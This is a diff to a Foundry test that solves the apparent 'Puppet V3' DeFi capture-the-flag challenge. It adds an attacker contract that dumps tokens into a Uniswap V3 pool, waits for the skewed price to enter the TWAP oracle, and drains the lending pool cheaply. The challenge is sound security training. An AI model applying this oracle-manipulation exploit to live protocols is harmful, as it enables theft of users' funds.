@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
 import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
+import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
@@ -119,7 +120,15 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        PuppetV3Attacker attacker = new PuppetV3Attacker{value: PLAYER_INITIAL_ETH_BALANCE}(token, weth, lendingPool, recovery);
+
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+        attacker.manipulatePrice();
+
+        // Make manipulated tick contribute to the 10-minute TWAP window.
+        skip(114);
+
+        attacker.borrowAndRecover();
     }
 
     /**
@@ -134,4 +143,68 @@ contract PuppetV3Challenge is Test {
     function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
         return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
     }
+}
+
+contract PuppetV3Attacker is IUniswapV3SwapCallback {
+    uint160 private constant MIN_SQRT_RATIO_PLUS_ONE = 4295128740;
+    uint160 private constant MAX_SQRT_RATIO_MINUS_ONE = 1461446703485210103287273052203988822378723970341;
+
+    DamnValuableToken private immutable token;
+    WETH private immutable weth;
+    PuppetV3Pool private immutable lendingPool;
+    IUniswapV3Pool private immutable uniswapPool;
+    address private immutable recovery;
+    bool private immutable tokenIsToken0;
+
+    constructor(DamnValuableToken _token, WETH _weth, PuppetV3Pool _lendingPool, address _recovery) payable {
+        token = _token;
+        weth = _weth;
+        lendingPool = _lendingPool;
+        uniswapPool = _lendingPool.uniswapV3Pool();
+        recovery = _recovery;
+        tokenIsToken0 = address(_token) < address(_weth);
+    }
+
+    function manipulatePrice() external {
+        uint256 tokenBalance = token.balanceOf(address(this));
+
+        uniswapPool.swap({
+            recipient: address(this),
+            zeroForOne: tokenIsToken0,
+            amountSpecified: int256(tokenBalance),
+            sqrtPriceLimitX96: tokenIsToken0 ? MIN_SQRT_RATIO_PLUS_ONE : MAX_SQRT_RATIO_MINUS_ONE,
+            data: bytes("")
+        });
+    }
+
+    function borrowAndRecover() external {
+        weth.deposit{value: address(this).balance}();
+        weth.approve(address(lendingPool), type(uint256).max);
+
+        uint256 borrowAmount = token.balanceOf(address(lendingPool));
+        lendingPool.borrow(borrowAmount);
+
+        token.transfer(recovery, borrowAmount);
+    }
+
+    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external override {
+        require(msg.sender == address(uniswapPool), "Invalid callback sender");
+
+        if (amount0Delta > 0) {
+            if (tokenIsToken0) {
+                token.transfer(msg.sender, uint256(amount0Delta));
+            } else {
+                weth.transfer(msg.sender, uint256(amount0Delta));
+            }
+        }
+        if (amount1Delta > 0) {
+            if (tokenIsToken0) {
+                weth.transfer(msg.sender, uint256(amount1Delta));
+            } else {
+                token.transfer(msg.sender, uint256(amount1Delta));
+            }
+        }
+    }
+
+    receive() external payable {}
 }
